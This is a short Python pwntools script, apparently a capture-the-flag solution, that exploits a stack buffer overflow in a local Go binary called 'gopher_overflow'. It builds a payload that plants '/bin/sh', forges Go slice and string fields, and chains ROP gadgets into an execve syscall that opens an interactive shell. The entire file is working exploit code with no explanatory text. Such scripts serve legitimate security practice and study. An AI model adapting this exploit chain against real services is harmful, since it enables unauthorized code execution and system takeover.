from pwn import *

p = process('./gopher_overflow')
# p = remote('localhost', 7777)
context.arch = 'amd64'
context.terminal = 'bash'

# 0x428db2: mov rbx, rax ; add rsp, 0x10 ; pop rbp ; ret ;
# 0x404968: pop rax ; pop rbp ; ret ;
# 0x4036ee: mov rcx, 0x0000000000000000 ; ret ; 
# 0x4036c6: mov rsi, rcx ; mov rdi, rbx ; syscall ;

rop_mov_rbx_rax = 0x428db2
rop_pop_rax_rbp = 0x404968
rop_mov_rcx_0 = 0x4036ee
rop_mov_rsi_rcx_rdi_rbx_syscall = 0x4036c6
ofs_slicebytetostring = 0x20
ofs_read = 0x90
ofs_ret = 0xf0

payload = b'/bin/sh\0'
payload = payload.ljust(ofs_slicebytetostring, b'A')
payload += p64(0xc00012c000)
payload += p64(0x200)
payload = payload.ljust(ofs_read, b'A')
payload += p64(0xc0000be000)
payload += p64(0x1000)
payload += p64(0xdeadbeef)*3
payload += p64(0)       
payload = payload.ljust(ofs_ret, b'A')
payload += flat([
    rop_mov_rbx_rax, 
    b'A' * 0x18,
    rop_pop_rax_rbp,
    0x3b, 0,
    rop_mov_rcx_0,
    rop_mov_rsi_rcx_rdi_rbx_syscall
])

p.sendlineafter(b'? ', payload)
p.interactive()
